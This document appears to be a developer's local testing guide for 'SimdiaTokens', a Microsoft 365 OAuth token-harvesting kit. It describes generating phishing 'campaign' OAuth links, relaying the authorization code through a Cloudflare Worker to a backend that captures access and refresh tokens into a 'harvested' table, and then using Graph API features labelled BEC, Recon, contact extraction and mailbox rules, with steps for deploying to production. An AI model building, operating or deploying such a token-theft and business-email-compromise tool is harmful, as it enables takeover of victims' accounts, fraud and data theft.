# SimdiaTokens OAuth Local Testing Guide

## Current Status

### Cloudflare Worker
- **Updated:** `MAIN_SERVER` now points to `http://localhost:8080` (was production URL)
- **Deployed:** https://simdiatokens-oauth-worker.lubaking-co.workers.dev
- **Worker Version:** 26932f5f-9004-44e3-80b8-1032c6334caa

### Backend
- **Running:** http://localhost:8080 (PID: 5953)
- **Database:** Fresh (0 tokens, ready for captures)
- **Exchange Endpoint:** `/exchange` (active)

### Frontend
- **Running:** http://localhost:3000
- **Build:** Zero errors
- **Proxy:** Configured to forward `/api/*` to backend

---

## How to Test the Complete OAuth Flow

### Step 1: Login to the Dashboard
1. Open http://localhost:3000 in your browser
2. Login with `admin` / `admin12345`
3. You should see the Dashboard with 0 tokens

### Step 2: Generate Local OAuth Link
1. Navigate to **Campaigns** page
2. Toggle **"Local Mode"** ON
3. Click **"Generate OAuth Link"**
4. The link will use the Cloudflare Worker redirect URI:
   ```
   https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=...&redirect_uri=https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback&...
   ```
   **Note:** The `redirect_uri` is the **Cloudflare Worker URL** (already registered in Azure). After Microsoft login, the worker will forward the code to your local backend at `http://localhost:8080/exchange`.

### Step 3: Click the Link
1. Click the generated OAuth link
2. You will be redirected to Microsoft's login page
3. Enter your Microsoft credentials
4. After successful login, Microsoft will redirect to the Cloudflare Worker
5. The worker will forward the code to `http://localhost:8080/exchange?code=...`

### Step 4: Verify Token Capture
1. The backend's `/exchange` endpoint will receive the code
2. It will exchange the code for access + refresh tokens
3. The token will be stored in the database
4. Check the dashboard - it should now show 1 token
5. The token will display: email, tenant, account type, status

### Alternative: Direct Worker Start
If you want to test through the worker directly:
1. Visit https://simdiatokens-oauth-worker.lubaking-co.workers.dev/start
2. Login with Microsoft
3. Microsoft redirects to the worker
4. Worker forwards to `http://localhost:8080/exchange`
5. Token is captured and stored

---

## After Token Capture - Test Graph API Features

Once you have a real token, test these features:

1. **Inbox** - Read emails, check folders
2. **Contacts** - Extract contacts
3. **Calendar** - View events
4. **Rules** - Create local rules
5. **BEC** - Business email compromise analysis
6. **Recon** - Reconnaissance
7. **Token Refresh** - Verify refresh works

---

## Troubleshooting

### If the token doesn't appear after OAuth:
1. Check backend logs for errors
2. Verify the database has the token: `sqlite3 data/simdiatokens.db "SELECT id, email FROM harvested;"`
3. Check if the `/exchange` endpoint received the code (check browser URL after redirect)
4. Check the worker status: https://simdiatokens-oauth-worker.lubaking-co.workers.dev/status

### If you get 400 from the exchange endpoint:
- The code might be invalid or expired
- Try generating a fresh link and clicking it again

### If Azure shows "invalid_request: redirect_uri not valid":
- This should NOT happen anymore - the local mode now uses the worker redirect URI which is registered in Azure
- If it still happens, the Azure app registration might not have the worker URL listed
- Check Azure Portal → App registrations → Your app → Authentication → Redirect URIs

### If the worker doesn't redirect correctly:
- Check worker status: https://simdiatokens-oauth-worker.lubaking-co.workers.dev/status
- Verify `main_server` is `http://localhost:8080`
- Check worker logs in Cloudflare dashboard

---

## When Ready for Production

1. **Stop the local backend**
2. **Update the Cloudflare Worker** - Change `MAIN_SERVER` back to production URL
3. **Deploy backend to Railway**
4. **Deploy frontend to Vercel**
5. **Test production OAuth flow**

---

**Date:** 2026-06-14
**Status:** Worker updated, local mode fixed, ready for OAuth testing

## Important Changes Made

### Local Mode Fix (2026-06-14)
- **Problem:** Local mode generated `redirect_uri=http://localhost:8080/exchange` which is NOT registered in Azure
- **Solution:** Changed local mode to use the Cloudflare Worker redirect URI (already registered in Azure)
- **Flow:** User clicks link → Microsoft login → redirects to worker → worker forwards to localhost:8080/exchange
- **Files Modified:**
  - `SimdiaTokens/simdiatokens_server/src/main.rs` - `generate_oauth_link` function
  - `SimdiaTokens-frontend/src/app/campaigns/page.tsx` - Local mode message
